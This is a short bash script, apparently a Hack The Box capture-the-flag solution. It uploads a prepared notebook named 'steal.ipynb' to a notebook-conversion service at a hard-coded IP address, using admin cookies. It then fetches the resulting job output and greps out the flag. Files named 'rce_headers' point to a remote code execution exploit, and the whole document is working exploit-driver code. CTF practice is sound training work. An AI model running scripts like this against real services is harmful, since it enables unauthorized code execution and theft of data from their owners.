#!/bin/bash
TARGET="http://154.57.164.74:31330"

curl -s -X POST "$TARGET/convert" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -D /tmp/rce_headers.txt -o /dev/null

JOB_ID=$(grep -i 'location:' /tmp/rce_headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "job: $JOB_ID"

curl -s "$TARGET/jobs/$JOB_ID/download" \
  -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
  -o /tmp/flag_out.html

grep -oP 'HTB\{[^}]+\}' /tmp/flag_out.html